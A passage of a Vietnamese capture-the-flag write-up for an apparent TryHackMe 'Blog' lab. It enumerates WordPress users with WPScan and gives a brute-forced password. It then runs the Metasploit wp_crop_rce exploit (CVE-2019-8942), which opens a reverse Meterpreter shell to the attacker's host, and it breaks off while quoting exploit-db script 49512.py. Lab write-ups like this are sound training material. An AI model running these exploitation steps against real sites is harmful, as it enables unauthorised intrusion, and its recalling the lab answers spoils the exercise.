<a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a><span class=p>/</span><span class=err>&#39;</span>                    <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/]</span>
<a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a><span class=p>/</span><span class=n>dashboard</span>            <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>302</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>blog</span><span class=p>.</span><span class=n>thm</span><span class=p>/</span><span class=n>wp-admin</span><span class=p>/]</span>
</code></pre></div> <p>Với WordPress, ta có công cụ <a href=https://github.com/wpscanteam/wpscan/ >WPScan</a> dùng để scan nhanh lỗ hổng có được (tại wordpress nhiều lỗ hổng quá :V)</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=n>_______________________________________________________________</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>         <span class=n>__</span>          <span class=n>_______</span>   <span class=n>_____</span>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a>         <span class=p>\</span> <span class=p>\</span>        <span class=p>/</span> <span class=p>/</span>  <span class=n>__</span> <span class=p>\</span> <span class=p>/</span> <span class=n>____</span><span class=p>|</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>          <span class=p>\</span> <span class=p>\</span>  <span class=p>/\</span>  <span class=p>/</span> <span class=p>/|</span> <span class=p>|</span><span class=n>__</span><span class=p>)</span> <span class=p>|</span> <span class=p>(</span><span class=n>___</span>   <span class=n>___</span>  <span class=n>__</span> <span class=n>_</span> <span class=n>_</span> <span class=n>__</span> <span class=err>®</span>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>           <span class=p>\</span> <span class=p>\/</span>  <span class=p>\/</span> <span class=p>/</span> <span class=p>|</span>  <span class=n>___</span><span class=p>/</span> <span class=p>\</span><span class=n>___</span> <span class=p>\</span> <span class=p>/</span> <span class=n>__</span><span class=p>|/</span> <span class=n>_</span><span class=p>`</span> <span class=p>|</span> <span class=s1>&#39;_ \</span>
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a><span class=s1>            \  /\  /  | |     ____) | (__| (_| | | | |</span>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a><span class=s1>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a>
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a><span class=s1>         WordPress Security Scanner by the WPScan Team</span>
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a><span class=s1>                         Version 3.8.24</span>
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a><span class=s1>       Sponsored by Automattic - https://automattic.com/</span>
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a><span class=s1>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span>
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a><span class=s1>_______________________________________________________________</span>
<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a>
<a id=__codelineno-2-15 name=__codelineno-2-15 href=#__codelineno-2-15></a><span class=s1>[+] URL: http://10.10.184.240/ [10.10.184.240]</span>
<a id=__codelineno-2-16 name=__codelineno-2-16 href=#__codelineno-2-16></a><span class=s1>[+] Started: HIDDEN</span>
<a id=__codelineno-2-17 name=__codelineno-2-17 href=#__codelineno-2-17></a>
<a id=__codelineno-2-18 name=__codelineno-2-18 href=#__codelineno-2-18></a><span class=s1>Interesting Finding(s):</span>
<a id=__codelineno-2-19 name=__codelineno-2-19 href=#__codelineno-2-19></a>
<a id=__codelineno-2-20 name=__codelineno-2-20 href=#__codelineno-2-20></a><span class=s1>[+] Headers</span>
<a id=__codelineno-2-21 name=__codelineno-2-21 href=#__codelineno-2-21></a><span class=s1> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span>
<a id=__codelineno-2-22 name=__codelineno-2-22 href=#__codelineno-2-22></a><span class=s1> | Found By: Headers (Passive Detection)</span>
<a id=__codelineno-2-23 name=__codelineno-2-23 href=#__codelineno-2-23></a><span class=s1> | Confidence: 100%</span>
<a id=__codelineno-2-24 name=__codelineno-2-24 href=#__codelineno-2-24></a>
<a id=__codelineno-2-25 name=__codelineno-2-25 href=#__codelineno-2-25></a><span class=s1>[+] robots.txt found: http://10.10.184.240/robots.txt</span>
<a id=__codelineno-2-26 name=__codelineno-2-26 href=#__codelineno-2-26></a><span class=s1> | Interesting Entries:</span>
<a id=__codelineno-2-27 name=__codelineno-2-27 href=#__codelineno-2-27></a><span class=s1> |  - /wp-admin/</span>
<a id=__codelineno-2-28 name=__codelineno-2-28 href=#__codelineno-2-28></a><span class=s1> |  - /wp-admin/admin-ajax.php</span>
<a id=__codelineno-2-29 name=__codelineno-2-29 href=#__codelineno-2-29></a><span class=s1> | Found By: Robots Txt (Aggressive Detection)</span>
<a id=__codelineno-2-30 name=__codelineno-2-30 href=#__codelineno-2-30></a><span class=s1> | Confidence: 100%</span>
<a id=__codelineno-2-31 name=__codelineno-2-31 href=#__codelineno-2-31></a>
<a id=__codelineno-2-32 name=__codelineno-2-32 href=#__codelineno-2-32></a><span class=s1>[+] XML-RPC seems to be enabled: http://10.10.184.240/xmlrpc.php</span>
<a id=__codelineno-2-33 name=__codelineno-2-33 href=#__codelineno-2-33></a><span class=s1> | Found By: Direct Access (Aggressive Detection)</span>
<a id=__codelineno-2-34 name=__codelineno-2-34 href=#__codelineno-2-34></a><span class=s1> | Confidence: 100%</span>
<a id=__codelineno-2-35 name=__codelineno-2-35 href=#__codelineno-2-35></a><span class=s1> | References:</span>
<a id=__codelineno-2-36 name=__codelineno-2-36 href=#__codelineno-2-36></a><span class=s1> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
<a id=__codelineno-2-37 name=__codelineno-2-37 href=#__codelineno-2-37></a><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span>
<a id=__codelineno-2-38 name=__codelineno-2-38 href=#__codelineno-2-38></a><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span>
<a id=__codelineno-2-39 name=__codelineno-2-39 href=#__codelineno-2-39></a><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span>
<a id=__codelineno-2-40 name=__codelineno-2-40 href=#__codelineno-2-40></a><span class=s1> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span>
<a id=__codelineno-2-41 name=__codelineno-2-41 href=#__codelineno-2-41></a>
<a id=__codelineno-2-42 name=__codelineno-2-42 href=#__codelineno-2-42></a><span class=s1>[+] WordPress readme found: http://10.10.184.240/readme.html</span>
<a id=__codelineno-2-43 name=__codelineno-2-43 href=#__codelineno-2-43></a><span class=s1> | Found By: Direct Access (Aggressive Detection)</span>
<a id=__codelineno-2-44 name=__codelineno-2-44 href=#__codelineno-2-44></a><span class=s1> | Confidence: 100%</span>
<a id=__codelineno-2-45 name=__codelineno-2-45 href=#__codelineno-2-45></a>
<a id=__codelineno-2-46 name=__codelineno-2-46 href=#__codelineno-2-46></a><span class=s1>[+] Upload directory has listing enabled: http://10.10.184.240/wp-content/uploads/</span>
<a id=__codelineno-2-47 name=__codelineno-2-47 href=#__codelineno-2-47></a><span class=s1> | Found By: Direct Access (Aggressive Detection)</span>
<a id=__codelineno-2-48 name=__codelineno-2-48 href=#__codelineno-2-48></a><span class=s1> | Confidence: 100%</span>
<a id=__codelineno-2-49 name=__codelineno-2-49 href=#__codelineno-2-49></a>
<a id=__codelineno-2-50 name=__codelineno-2-50 href=#__codelineno-2-50></a><span class=s1>[+] The external WP-Cron seems to be enabled: http://10.10.184.240/wp-cron.php</span>
<a id=__codelineno-2-51 name=__codelineno-2-51 href=#__codelineno-2-51></a><span class=s1> | Found By: Direct Access (Aggressive Detection)</span>
<a id=__codelineno-2-52 name=__codelineno-2-52 href=#__codelineno-2-52></a><span class=s1> | Confidence: 60%</span>
<a id=__codelineno-2-53 name=__codelineno-2-53 href=#__codelineno-2-53></a><span class=s1> | References:</span>
<a id=__codelineno-2-54 name=__codelineno-2-54 href=#__codelineno-2-54></a><span class=s1> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
<a id=__codelineno-2-55 name=__codelineno-2-55 href=#__codelineno-2-55></a><span class=s1> |  - https://github.com/wpscanteam/wpscan/issues/1299</span>
<a id=__codelineno-2-56 name=__codelineno-2-56 href=#__codelineno-2-56></a>
<a id=__codelineno-2-57 name=__codelineno-2-57 href=#__codelineno-2-57></a><span class=s1>[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).</span>
<a id=__codelineno-2-58 name=__codelineno-2-58 href=#__codelineno-2-58></a><span class=s1> | Found By: Emoji Settings (Passive Detection)</span>
<a id=__codelineno-2-59 name=__codelineno-2-59 href=#__codelineno-2-59></a><span class=s1> |  - http://10.10.184.240/, Match: &#39;</span><span class=n>wp-includes</span><span class=p>\/</span><span class=n>js</span><span class=p>\/</span><span class=n>wp-emoji-release</span><span class=p>.</span><span class=n>min</span><span class=p>.</span><span class=n>js</span><span class=k>?</span><span class=n>ver</span><span class=p>=</span><span class=n>5</span><span class=p>.</span><span class=n>0</span><span class=s1>&#39;</span>
<a id=__codelineno-2-60 name=__codelineno-2-60 href=#__codelineno-2-60></a><span class=s1> | Confirmed By: Meta Generator (Passive Detection)</span>
<a id=__codelineno-2-61 name=__codelineno-2-61 href=#__codelineno-2-61></a><span class=s1> |  - http://10.10.184.240/, Match: &#39;</span><span class=n>WordPress</span> <span class=n>5</span><span class=p>.</span><span class=n>0</span><span class=err>&#39;</span>
<a id=__codelineno-2-62 name=__codelineno-2-62 href=#__codelineno-2-62></a>
<a id=__codelineno-2-63 name=__codelineno-2-63 href=#__codelineno-2-63></a><span class=no>[i]</span> <span class=n>The</span> <span class=n>main</span> <span class=n>theme</span> <span class=n>could</span> <span class=n>not</span> <span class=n>be</span> <span class=n>detected</span><span class=p>.</span>
<a id=__codelineno-2-64 name=__codelineno-2-64 href=#__codelineno-2-64></a>
<a id=__codelineno-2-65 name=__codelineno-2-65 href=#__codelineno-2-65></a><span class=p>[+]</span> <span class=n>Enumerating</span> <span class=n>Users</span> <span class=p>(</span><span class=n>via</span> <span class=n>Passive</span> <span class=n>and</span> <span class=n>Aggressive</span> <span class=n>Methods</span><span class=p>)</span>
<a id=__codelineno-2-66 name=__codelineno-2-66 href=#__codelineno-2-66></a> <span class=n>Brute</span> <span class=n>Forcing</span> <span class=n>Author</span> <span class=n>IDs</span> <span class=p>-</span> <span class=n>Time</span><span class=p>:</span> <span class=n>00</span><span class=p>:</span><span class=n>00</span><span class=p>:</span><span class=n>01</span> <span class=p>&lt;==============================================================================================================================================================&gt;</span> <span class=p>(</span><span class=n>10</span> <span class=p>/</span> <span class=n>10</span><span class=p>)</span> <span class=n>100</span><span class=p>.</span><span class=n>00</span><span class=p>%</span> <span class=n>Time</span><span class=p>:</span> <span class=n>00</span><span class=p>:</span><span class=n>00</span><span class=p>:</span><span class=n>01</span>
<a id=__codelineno-2-67 name=__codelineno-2-67 href=#__codelineno-2-67></a>
<a id=__codelineno-2-68 name=__codelineno-2-68 href=#__codelineno-2-68></a><span class=no>[i]</span> <span class=n>User</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>Identified</span><span class=p>:</span>
<a id=__codelineno-2-69 name=__codelineno-2-69 href=#__codelineno-2-69></a>
<a id=__codelineno-2-70 name=__codelineno-2-70 href=#__codelineno-2-70></a><span class=p>[+]</span> <span class=n>bjoel</span>
<a id=__codelineno-2-71 name=__codelineno-2-71 href=#__codelineno-2-71></a> <span class=p>|</span> <span class=n>Found</span> <span class=n>By</span><span class=p>:</span> <span class=n>Wp</span> <span class=n>Json</span> <span class=n>Api</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-72 name=__codelineno-2-72 href=#__codelineno-2-72></a> <span class=p>|</span>  <span class=p>-</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>wp-json</span><span class=p>/</span><span class=n>wp</span><span class=p>/</span><span class=n>v2</span><span class=p>/</span><span class=n>users</span><span class=p>/</span><span class=k>?</span><span class=n>per_page</span><span class=p>=</span><span class=n>100</span><span class=p>&amp;</span><span class=n>page</span><span class=p>=</span><span class=n>1</span>
<a id=__codelineno-2-73 name=__codelineno-2-73 href=#__codelineno-2-73></a> <span class=p>|</span> <span class=n>Confirmed</span> <span class=n>By</span><span class=p>:</span>
<a id=__codelineno-2-74 name=__codelineno-2-74 href=#__codelineno-2-74></a> <span class=p>|</span>  <span class=n>Author</span> <span class=n>Id</span> <span class=n>Brute</span> <span class=n>Forcing</span> <span class=p>-</span> <span class=n>Author</span> <span class=n>Pattern</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-75 name=__codelineno-2-75 href=#__codelineno-2-75></a> <span class=p>|</span>  <span class=n>Login</span> <span class=n>Error</span> <span class=n>Messages</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-76 name=__codelineno-2-76 href=#__codelineno-2-76></a>
<a id=__codelineno-2-77 name=__codelineno-2-77 href=#__codelineno-2-77></a><span class=p>[+]</span> <span class=n>kwheel</span>
<a id=__codelineno-2-78 name=__codelineno-2-78 href=#__codelineno-2-78></a> <span class=p>|</span> <span class=n>Found</span> <span class=n>By</span><span class=p>:</span> <span class=n>Wp</span> <span class=n>Json</span> <span class=n>Api</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-79 name=__codelineno-2-79 href=#__codelineno-2-79></a> <span class=p>|</span>  <span class=p>-</span> <span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>/</span><span class=n>wp-json</span><span class=p>/</span><span class=n>wp</span><span class=p>/</span><span class=n>v2</span><span class=p>/</span><span class=n>users</span><span class=p>/</span><span class=k>?</span><span class=n>per_page</span><span class=p>=</span><span class=n>100</span><span class=p>&amp;</span><span class=n>page</span><span class=p>=</span><span class=n>1</span>
<a id=__codelineno-2-80 name=__codelineno-2-80 href=#__codelineno-2-80></a> <span class=p>|</span> <span class=n>Confirmed</span> <span class=n>By</span><span class=p>:</span>
<a id=__codelineno-2-81 name=__codelineno-2-81 href=#__codelineno-2-81></a> <span class=p>|</span>  <span class=n>Author</span> <span class=n>Id</span> <span class=n>Brute</span> <span class=n>Forcing</span> <span class=p>-</span> <span class=n>Author</span> <span class=n>Pattern</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-82 name=__codelineno-2-82 href=#__codelineno-2-82></a> <span class=p>|</span>  <span class=n>Login</span> <span class=n>Error</span> <span class=n>Messages</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-83 name=__codelineno-2-83 href=#__codelineno-2-83></a>
<a id=__codelineno-2-84 name=__codelineno-2-84 href=#__codelineno-2-84></a><span class=p>[+]</span> <span class=n>Karen</span> <span class=n>Wheeler</span>
<a id=__codelineno-2-85 name=__codelineno-2-85 href=#__codelineno-2-85></a> <span class=p>|</span> <span class=n>Found</span> <span class=n>By</span><span class=p>:</span> <span class=n>Rss</span> <span class=n>Generator</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-86 name=__codelineno-2-86 href=#__codelineno-2-86></a>
<a id=__codelineno-2-87 name=__codelineno-2-87 href=#__codelineno-2-87></a><span class=p>[+]</span> <span class=n>Billy</span> <span class=n>Joel</span>
<a id=__codelineno-2-88 name=__codelineno-2-88 href=#__codelineno-2-88></a> <span class=p>|</span> <span class=n>Found</span> <span class=n>By</span><span class=p>:</span> <span class=n>Rss</span> <span class=n>Generator</span> <span class=p>(</span><span class=n>Aggressive</span> <span class=n>Detection</span><span class=p>)</span>
<a id=__codelineno-2-89 name=__codelineno-2-89 href=#__codelineno-2-89></a>
<a id=__codelineno-2-90 name=__codelineno-2-90 href=#__codelineno-2-90></a><span class=p>[!]</span> <span class=n>No</span> <span class=n>WPScan</span> <span class=n>API</span> <span class=n>Token</span> <span class=n>given</span><span class=p>,</span> <span class=n>as</span> <span class=n>a</span> <span class=n>result</span> <span class=n>vulnerability</span> <span class=n>data</span> <span class=n>has</span> <span class=n>not</span> <span class=n>been</span> <span class=n>output</span><span class=p>.</span>
<a id=__codelineno-2-91 name=__codelineno-2-91 href=#__codelineno-2-91></a><span class=p>[!]</span> <span class=n>You</span> <span class=n>can</span> <span class=n>get</span> <span class=n>a</span> <span class=n>free</span> <span class=n>API</span> <span class=n>token</span> <span class=n>with</span> <span class=n>25</span> <span class=n>daily</span> <span class=n>requests</span> <span class=n>by</span> <span class=n>registering</span> <span class=n>at</span> <span class=n>https</span><span class=p>://</span><span class=n>wpscan</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>register</span>
</code></pre></div> <p>Từ kết quả trên, ta thấy rằng WPScan tìm được 2 user là bjoel và kwheel, từ đây ta brute force thử vào trang login của website blog.thm</p> <p>Dùng hydra hoặc burpsuite hoặc bất cứ tool nào khác để brute force password. Chắc chắn sẽ ra</p> <details class=info> <summary>Nooooo</summary> <p>username: kwheel</p> <p>password: cutiepie1</p> </details> <p>Vào được trang quản lí rồi :V</p> <p> <figure><img src=image-2.png><figcaption>Trang quản lí</figcaption> </figure> </p> <p>Ta thấy trang quản lí sử dụng WordPress 5.0, ta dùng searchsploit để tìm kiếm lỗ hổng có thể khai thác từ đây</p> <p> <figure><img src=image-3.png><figcaption>Kết quả của searchsploit</figcaption> </figure> </p> <p>Nhìn kết quả trên ta thấy được lỗ hổng Image Remote Code Execution thuộc <a href=https://www.exploit-db.com/exploits/49512>CVE-2019-8942</a></p> <h3 id=init-access><strong>Init Access</strong><a class=headerlink href=#init-access title="Permanent link">&para;</a></h3> <h4 id=metasploit><strong>Metasploit</strong><a class=headerlink href=#metasploit title="Permanent link">&para;</a></h4> <p>Từ phần trên ta có 2 hướng khai thác bằng Metasploit</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=p>/</span><span class=n>http</span><span class=p>/</span><span class=n>wp_crop_rce</span><span class=p>)</span> <span class=p>&gt;</span> <span class=n>options</span>
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a><span class=n>Module</span> <span class=n>options</span> <span class=p>(</span><span class=n>exploit</span><span class=p>/</span><span class=n>multi</span><span class=p>/</span><span class=n>http</span><span class=p>/</span><span class=n>wp_crop_rce</span><span class=p>):</span>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>   <span class=n>Name</span>       <span class=n>Current</span> <span class=n>Setting</span>  <span class=n>Required</span>  <span class=n>Description</span>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a>   <span class=p>----</span>       <span class=p>---------------</span>  <span class=p>--------</span>  <span class=p>-----------</span>
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a>   <span class=n>PASSWORD</span>   <span class=n>cutiepie1</span>        <span class=n>yes</span>       <span class=n>The</span> <span class=n>WordPress</span> <span class=n>password</span> <span class=n>to</span> <span class=n>authenticate</span> <span class=n>with</span>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a>   <span class=n>Proxies</span>                     <span class=n>no</span>        <span class=n>A</span> <span class=n>proxy</span> <span class=n>chain</span> <span class=n>of</span> <span class=n>format</span> <span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>[,</span><span class=n>type</span><span class=p>:</span><span class=n>host</span><span class=p>:</span><span class=n>port</span><span class=p>][...]</span>
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a>   <span class=n>RHOSTS</span>     <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span>    <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>host</span><span class=p>(</span><span class=n>s</span><span class=p>),</span> <span class=n>see</span> <span class=n>https</span><span class=p>://</span><span class=n>docs</span><span class=p>.</span><span class=n>metasploit</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>docs</span><span class=p>/</span><span class=n>using-metasploit</span>
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a>                                         <span class=p>/</span><span class=n>basics</span><span class=p>/</span><span class=n>using-metasploit</span><span class=p>.</span><span class=n>html</span>
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a>   <span class=n>RPORT</span>      <span class=n>80</span>               <span class=n>yes</span>       <span class=n>The</span> <span class=n>target</span> <span class=n>port</span> <span class=p>(</span><span class=n>TCP</span><span class=p>)</span>
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a>   <span class=n>SSL</span>        <span class=n>false</span>            <span class=n>no</span>        <span class=n>Negotiate</span> <span class=n>SSL</span><span class=p>/</span><span class=n>TLS</span> <span class=k>for</span> <span class=n>outgoing</span> <span class=n>connections</span>
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a>   <span class=n>TARGETURI</span>  <span class=p>/</span>                <span class=n>yes</span>       <span class=n>The</span> <span class=n>base</span> <span class=n>path</span> <span class=n>to</span> <span class=n>the</span> <span class=n>wordpress</span> <span class=n>application</span>
<a id=__codelineno-3-14 name=__codelineno-3-14 href=#__codelineno-3-14></a>   <span class=n>THEME_DIR</span>                   <span class=n>no</span>        <span class=n>The</span> <span class=n>WordPress</span> <span class=n>theme</span> <span class=nb>dir </span><span class=n>name</span> <span class=p>(</span><span class=n>disable</span> <span class=n>theme</span> <span class=n>auto-detection</span> <span class=k>if</span> <span class=n>provided</span><span class=p>)</span>
<a id=__codelineno-3-15 name=__codelineno-3-15 href=#__codelineno-3-15></a>   <span class=n>USERNAME</span>   <span class=n>kwheel</span>           <span class=n>yes</span>       <span class=n>The</span> <span class=n>WordPress</span> <span class=n>username</span> <span class=n>to</span> <span class=n>authenticate</span> <span class=n>with</span>
<a id=__codelineno-3-16 name=__codelineno-3-16 href=#__codelineno-3-16></a>   <span class=n>VHOST</span>                       <span class=n>no</span>        <span class=n>HTTP</span> <span class=n>server</span> <span class=n>virtual</span> <span class=n>host</span>
</code></pre></div> <blockquote> <p> <figure><img src=image-1.png><figcaption>Options</figcaption> </figure> </p> </blockquote> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=p>/</span><span class=n>http</span><span class=p>/</span><span class=n>wp_crop_rce</span><span class=p>)</span> <span class=p>&gt;</span> <span class=n>exploit</span>
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a><span class=p>[*]</span> <span class=n>Started</span> <span class=n>reverse</span> <span class=n>TCP</span> <span class=n>handler</span> <span class=n>on</span> <span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span><span class=p>:</span><span class=n>443</span> 
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a><span class=p>[*]</span> <span class=n>Authenticating</span> <span class=n>with</span> <span class=n>WordPress</span> <span class=n>using</span> <span class=n>kwheel</span><span class=p>:</span><span class=n>cutiepie1</span><span class=p>...</span>
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a><span class=p>[+]</span> <span class=n>Authenticated</span> <span class=n>with</span> <span class=n>WordPress</span>
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a><span class=p>[*]</span> <span class=n>Preparing</span> <span class=n>payload</span><span class=p>...</span>
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a><span class=p>[*]</span> <span class=n>Uploading</span> <span class=n>payload</span>
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a><span class=p>[+]</span> <span class=n>Image</span> <span class=n>uploaded</span>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a><span class=p>[*]</span> <span class=n>Including</span> <span class=n>into</span> <span class=n>theme</span>
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a><span class=p>[*]</span> <span class=n>Sending</span> <span class=n>stage</span> <span class=p>(</span><span class=n>39927</span> <span class=n>bytes</span><span class=p>)</span> <span class=n>to</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span>
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a><span class=p>[*]</span> <span class=n>Meterpreter</span> <span class=n>session</span> <span class=n>1</span> <span class=n>opened</span> <span class=p>(</span><span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span><span class=p>:</span><span class=n>443</span> <span class=p>-&gt;</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>184</span><span class=p>.</span><span class=n>240</span><span class=p>:</span><span class=n>54232</span><span class=p>)</span> <span class=n>at</span> <span class=n>2023</span><span class=p>-</span><span class=n>08</span><span class=p>-</span><span class=n>27</span> <span class=n>09</span><span class=p>:</span><span class=n>21</span><span class=p>:</span><span class=n>20</span> <span class=p>-</span><span class=n>0400</span>
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a><span class=p>[*]</span> <span class=n>Attempting</span> <span class=n>to</span> <span class=n>clean</span> <span class=n>up</span> <span class=n>files</span><span class=p>...</span>
</code></pre></div> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=n>meterpreter</span> <span class=p>&gt;</span> <span class=n>shell</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=k>Process</span> <span class=n>1834</span> <span class=n>created</span><span class=p>.</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=n>Channel</span> <span class=n>1</span> <span class=n>created</span><span class=p>.</span>
</code></pre></div> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=n>python</span> <span class=n>-c</span> <span class=s1>&#39;import pty;pty.spawn (&quot;/bin/bash&quot;);&#39;</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=n>www-data</span><span class=nv>@blog</span><span class=p>:/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>wordpress</span><span class=p>$</span>
</code></pre></div> <p>Cuối cùng cũng đã thành công bước đầu của việc thâm nhập hệ thống.</p> <h4 id=python-script><strong>Python script</strong><a class=headerlink href=#python-script title="Permanent link">&para;</a></h4> <p>Nhìn lại searchsploit nào, ta có thể dùng python (file 49512.py) để khai thác lỗ hỏng Image Remote Code Excution trên WordPress 5.0</p> <p> <figure><img src=image-14.png><figcaption>Hình ảnh mô tả kết quả searchsploit</figcaption> </figure> </p> <div class=highlight><span class=filename>49512.py</span><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=c1># Exploit Title: WordPress 5.0.0 - Image Remote Code Execution</span>
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a><span class=c1># Date: 2020-02-01</span>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a><span class=c1># Exploit Authors: OUSSAMA RAHALI ( aka V0lck3r)</span>
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a><span class=c1># Discovery Author : RIPSTECH Technology</span>
